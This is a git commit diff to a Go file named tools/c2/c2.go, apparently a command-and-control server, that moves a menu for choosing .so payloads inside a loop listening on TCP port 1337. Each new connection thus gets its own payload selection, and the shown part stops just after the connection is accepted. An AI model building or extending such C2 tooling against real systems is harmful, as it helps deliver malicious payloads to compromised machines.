4b281457d0a14615c7cdb4b1d4b6fce909f88108
ifyGecko <26214995+ifyGecko@users.noreply.github.com>
2020-06-14 23:19:04 -0500

    c2 now gives payload menu selection in a loop for each new connection

--- tools/c2/c2.go
+++ tools/c2/c2.go
@@ -11,32 +11,33 @@ import "strings"
 
 func main(){
 
-	// get list of available payloads
-	payloads, _ := filepath.Glob("../../payloads/*.so")
-
-	// display payload selection menu
-	for i := 0; i < len(payloads); i++{
-		fmt.Println("[", i, "]", payloads[i])
-	}
-	
-	// get user payload selection
-	fmt.Print("Select a payload: ")
-	reader := bufio.NewReader(os.Stdin)
-	input, _ := reader.ReadString('\n')
-	input = strings.Replace(input, "\n", "", -1)
-	index, _ := strconv.Atoi(input)
-	
-	// get file stats of payload
-	filestats, _ := os.Stat(payloads[index])
-
-	// get the size
-	filesize := filestats.Size()
-	
 	// listen on all interfaces
 	listener, _ := net.Listen("tcp", ":1337")
 	
 	// run loop forever
 	for{
+
+		// get list of available payloads
+		payloads, _ := filepath.Glob("../../payloads/*.so")
+
+		// display payload selection menu
+		for i := 0; i < len(payloads); i++{
+			fmt.Println("[", i, "]", payloads[i])
+		}
+		
+		// get user payload selection
+		fmt.Print("Select a payload: ")
+		reader := bufio.NewReader(os.Stdin)
+		input, _ := reader.ReadString('\n')
+		input = strings.Replace(input, "\n", "", -1)
+		index, _ := strconv.Atoi(input)
+		
+		// get file stats of payload
+		filestats, _ := os.Stat(payloads[index])
+
+		// get the size
+		filesize := filestats.Size()
+		
 		// accept connectionection on port
 		connection, _ := listener.Accept()
 		
